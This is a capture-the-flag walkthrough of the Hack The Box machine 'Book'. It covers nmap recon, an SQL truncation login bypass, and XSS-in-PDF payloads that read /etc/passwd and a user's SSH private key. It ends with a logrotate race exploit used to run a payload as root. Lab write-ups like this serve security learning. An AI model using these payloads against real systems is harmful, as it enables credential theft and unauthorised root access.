# BOOK

## NMAP

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/book]
└─$ nmap 10.10.10.176
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-09 05:18 EST
Nmap scan report for 10.10.10.176
Host is up (0.27s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 54.24 seconds
                                                                                                                                                                                                              
┌──(kali㉿kali)-[~/Downloads/hackthebox/book]
└─$ nmap 10.10.10.176 -p 22,80 -A                                                                 255 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-09 05:20 EST
Nmap scan report for 10.10.10.176
Host is up (0.27s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 (RSA)
|   256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd (ECDSA)
|_  256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: LIBRARY - Read | Learn | Have Fun
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## WEBSITE

![](https://github.com/Leo-2807/Writeups/blob/main/images/book1.png)

### SIGN IN

Since we do not have creds to log in, I used sign up to create a user `test` and logged in as test.

![](https://github.com/Leo-2807/Writeups/blob/main/images/book2.png)

![](https://github.com/Leo-2807/Writeups/blob/main/images/book3.png)

But there was nothing else to be done. After wasting some time going down rabbit holes, I was back to the sign up page. 

Running gobuster I found `/admin` login page.

![](https://github.com/Leo-2807/Writeups/blob/main/images/book6.png)

The creds that I created does not work here.

## ADMIN LOGIN

Getting back to the sign up page I looked through the source code, and found something interesting.

```php
<script>
  if (document.location.search.match(/type=embed/gi)) {
    window.parent.postMessage("resize", "*");
  }
function validateForm() {
  var x = document.forms["myForm"]["name"].value;
  var y = document.forms["myForm"]["email"].value;
  if (x == "") {
    alert("Please fill name field. Should not be more than 10 characters");
    return false;
  }
  if (y == "") {
    alert("Please fill email field. Should not be more than 20 characters");
    return false;
  }
}
</script>
```

After a long google search and a hint from the forum I found the `sql truncation atack`. 

```
SQL truncation is a web application vulnerability in which an input is truncated (deleted) when added to the database due to surpassing the maximum defined length.
```

Here's a [article](https://medium.com/r3d-buck3t/bypass-authentication-with-sql-truncation-attack-25a0c33ab87f) which explains it further.

Opening burpsuite I intercepted the request and modified it.

![](https://github.com/Leo-2807/Writeups/blob/main/images/book8.png)

Now replace the + with spaces and url encode it.

![](https://github.com/Leo-2807/Writeups/blob/main/images/book4.png)

Now we can login to the admin login page.

![](https://github.com/Leo-2807/Writeups/blob/main/images/book9.png)

![](https://github.com/Leo-2807/Writeups/blob/main/images/book5.png)

## LFI

Opening the collections page we have two pdf files. They have tables of users and the books.  

![](https://github.com/Leo-2807/Writeups/blob/main/images/book7.png)

Searching for `pdf lfi exploit` on google led me to a interesting [exploit](https://blog.noob.ninja/local-file-read-via-xss-in-dynamically-generated-pdf/)

![](https://github.com/Leo-2807/Writeups/blob/main/images/book10.png)

To try this exploit I went to the non admin user and I created since the collection page there had a upload form.

In there instead of book title I wrote my payload and uploaded a empty pdf file.

```php
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
```

![](https://github.com/Leo-2807/Writeups/blob/main/images/book11.png)

And this time on opening the collections pdf we get the contents of the `/etc/passwd` file.

![](https://github.com/Leo-2807/Writeups/blob/main/images/book12.png)

## SSH

From the `/etc/passwd` file we know that `reader` is the only interactive user, I tried to get the ssh private key.

```php
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>
```

And we got it.

![](https://github.com/Leo-2807/Writeups/blob/main/images/book13.png)

 Now we can ssh into the box as user reader and read the user.txt.

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/book]
└─$ ssh -i id_rsa reader@10.10.10.176
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 5.4.1-050401-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Nov  9 13:02:22 UTC 2021

  System load:  0.02              Processes:             212
  Usage of /:   52.7% of 5.77GB   Users logged in:       0
  Memory usage: 12%               IP address for ens160: 10.10.10.176
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

109 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Jan 29 13:03:06 2020 from 10.10.14.3
reader@book:~$ id
uid=1000(reader) gid=1000(reader) groups=1000(reader)
reader@book:~$ ls
backups  user.txt
```

## PRIVESEC

There are two log files inside backups directory but they do not have anything interesting in them.

```bash
reader@book:~$ cd backups/
reader@book:~/backups$ ls
access.log  access.log.1
reader@book:~/backups$ cat access.log
reader@book:~/backups$ cat access.log.1
192.168.0.104 - - [29/Jun/2019:14:39:55 +0000] "GET /robbie03 HTTP/1.1" 404 446 "-" "curl"
```

I ran a few privesec scripts among them pspy gave some interesting results.

```bash
2021/11/09 13:17:28 CMD: UID=0    PID=60385  | sleep 5 
2021/11/09 13:17:33 CMD: UID=0    PID=60386  | /bin/sh /root/log.sh 
2021/11/09 13:17:33 CMD: UID=0    PID=60387  | /usr/sbin/logrotate -f /root/log.cfg 
2021/11/09 13:17:33 CMD: UID=0    PID=60388  | sleep 5 
2021/11/09 13:17:38 CMD: UID=0    PID=60389  | /bin/sh /root/log.sh 
2021/11/09 13:17:38 CMD: UID=0    PID=60391  | sleep 5 
```

This is being repeated every 5 seconds.

On googling about logrotate privesec I found this [article](https://book.hacktricks.xyz/linux-unix/privilege-escalation).

```
Logrotate is a Linux program that manages log files and compresses them for backups and analysis. It runs automatically through the Cron utility.
```

There was a link to a gothub [exploit](https://github.com/whotwagner/logrotten).

I downloaded the script on the target machine and compiled it.

I wrote a simple script to read the root.txt file.

```bash
reader@book:~$ echo "cat /root/root.txt > /home/reader/root.txt" > payloadfile
...snip...
reader@book:~$ echo "hello"> backups/access.log; ./logrotten -p ./payloadfile /home/reader/backups/access.log
Waiting for rotating /home/reader/backups/access.log...
Renamed /home/reader/backups with /home/reader/backups2 and created symlink to /etc/bash_completion.d
Waiting 1 seconds before writing payload...
Done!
reader@book:~$ ls
backups  logrotten logrotten.c  payloadfile root.txt user.txt
```

It took a few tries but I got the root.txt. 